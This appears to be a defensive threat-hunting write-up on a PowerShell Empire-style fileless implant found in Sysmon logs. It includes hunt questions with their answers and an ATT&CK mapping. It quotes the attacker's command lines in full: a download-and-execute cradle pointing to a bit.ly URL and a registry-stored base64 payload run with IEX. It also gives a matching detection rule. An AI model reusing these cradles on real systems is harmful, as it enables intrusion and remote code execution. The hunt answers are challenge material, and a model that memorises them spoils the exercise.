# 04 — FYODOR-L PowerShell implant (Empire-style)

## The thread

`FYODOR-L.froth.ly` is the loudest Sysmon host in the dataset, and the noise turns out to be a live PowerShell implant. The host runs `powershell.exe -NonI -W hidden -c "IEX (...FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))"`. That one line is the whole tradecraft: read a base64 blob out of a registry value, decode it in memory, and execute it with `IEX`. Nothing touches disk, so file-hash and AV signatures never get a look.

The same command runs under two identities. Once as `AzureAD\FyodorMalteskesko` (the logged-in user), and once as `NT AUTHORITY\SYSTEM` with a parent of `svchost.exe -k netsvcs -p -s Schedule`. That parent is the Task Scheduler, so the implant has a scheduled task re-launching it as SYSTEM. User-context plus SYSTEM-context persistence is the standard PowerShell Empire footprint.

Working backwards, the initial stager is a `Net.WebClient` download: `iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")`, delivered behind a bit.ly link with a "PowerShell + HTML5 prototype, needs audio" lure. The agent that the stager pulls down then spawns the hidden child processes with `-enc <base64>` launchers.

## How I worked it

1. Ranked Sysmon `EventCode=1` (process create) by `Computer`. `FYODOR-L` dominates, so I pulled its PowerShell process tree apart.
2. Filtered command lines for `FromBase64String`. Two hits, both on `FYODOR-L`, both hidden-window in-memory decoders. That is the implant executing.
3. Extracted the registry path the decoder reads from: `HKLM:\Software\Microsoft\Network`, value `debug`. The payload lives in the registry, which is why nothing shows up as a dropped file.
4. Pulled the `DownloadString` URL to find initial access: `http://bit.ly/e0Mw9w`. Then split the executing identities and confirmed the SYSTEM copy is parented by the Task Scheduler (the persistence), while the user copy runs as `FyodorMalteskesko`.

## Reading the results

This is a textbook fileless foothold. The detection surface is not a binary or a hash, it is the *shape* of the command line: a hidden-window PowerShell that pipes `FromBase64String` into `IEX`, or pulls code over HTTP with `Net.WebClient`. Both are rare enough in a brewery's process telemetry to alert on directly.

`FYODOR-L` is a different host from the `BSTOLL-L` thread in scenarios 01-03, so this is a second compromised endpoint, not a continuation of the same one. Frothly had at least two separate footholds running concurrently on 2018-08-20: a browser-resident cryptominer on `BSTOLL-L` and a PowerShell Empire agent on `FYODOR-L`.

## Hunts

| # | File | Question | Answer |
|---|---|---|---|
| 1 | `hunts/01-encoded-ps-host.spl` | Which host ran in-memory PowerShell that decodes a base64 payload? | `FYODOR-L.froth.ly` |
| 2 | `hunts/02-registry-payload-path.spl` | Which registry path stored the encoded implant? | `HKLM:\Software\Microsoft\Network` |
| 3 | `hunts/03-stager-url.spl` | What URL did the initial stager download from? | `http://bit.ly/e0Mw9w` |
| 4 | `hunts/04-implant-user.spl` | Which non-SYSTEM user account executed the implant? | `AzureAD\FyodorMalteskesko` |

## ATT&CK mapping

| Technique | Where it shows up |
|---|---|
| T1059.001 PowerShell | The entire implant runs as `powershell.exe` command lines |
| T1027 Obfuscated Files or Information | Base64 payload in the registry, `-enc` launchers |
| T1105 Ingress Tool Transfer | `Net.WebClient.DownloadString("http://bit.ly/e0Mw9w")` |
| T1053.005 Scheduled Task | SYSTEM copy parented by `svchost.exe ... -s Schedule` |
| T1112 Modify Registry | Payload stored in and read from `HKLM:\Software\Microsoft\Network` |

## What I would have detected

One rule on `EventCode=1 Image=*\powershell.exe` where the command line matches `FromBase64String` or `New-Object Net.WebClient` or `-enc ` would have fired on the first stager execution, before persistence was even installed. Encoded and download-cradle PowerShell is the cheapest, highest-signal endpoint alert available, and `FYODOR-L` lit it up repeatedly.
